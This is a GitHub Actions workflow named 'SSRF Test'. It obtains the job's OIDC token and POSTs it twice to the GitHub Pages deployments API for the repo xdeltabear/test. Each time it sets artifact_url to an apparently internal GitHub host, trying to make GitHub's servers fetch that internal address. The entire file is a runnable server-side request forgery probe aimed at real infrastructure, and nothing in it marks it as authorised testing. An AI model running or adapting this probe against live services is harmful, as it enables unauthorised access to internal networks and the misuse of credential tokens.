name: SSRF Test
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
  pages: write

jobs:
  ssrf-test:
    runs-on: ubuntu-latest
    steps:
    - name: Get OIDC token and test SSRF
      uses: actions/github-script@v7
      with:
        script: |
          const oidcToken = await core.getIDToken();
          console.log('Got OIDC token:', oidcToken.substring(0, 20) + '...');
          
          const response = await fetch(
            'https://api.github.com/repos/xdeltabear/test/pages/deployments',
            {
              method: 'POST',
              headers: {
                'Authorization': `Bearer ${process.env.GITHUB_TOKEN}`,
                'Accept': 'application/vnd.github+json',
                'Content-Type': 'application/json',
                'X-GitHub-Api-Version': '2022-11-28'
              },
              body: JSON.stringify({
                artifact_url: 'http://ssrf-target.iad.github.net/',
                pages_build_version: 'ssrf-test-v1',
                oidc_token: oidcToken,
                environment: 'github-pages'
              })
            }
          );
          const data = await response.json();
          console.log('Status:', response.status);
          console.log('Response:', JSON.stringify(data, null, 2));
          
          // Also try without pages: write permission path
          const response2 = await fetch(
            'https://api.github.com/repos/xdeltabear/test/pages/deployments',
            {
              method: 'POST',
              headers: {
                'Authorization': `Bearer ${process.env.GITHUB_TOKEN}`,
                'Accept': 'application/vnd.github+json',
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({
                artifact_url: 'http://ssrf-target.iad.github.net/test-ssrf',
                pages_build_version: 'ssrf-test-v2',
                oidc_token: oidcToken
              })
            }
          );
          const data2 = await response2.json();
          console.log('Response2:', JSON.stringify(data2, null, 2));
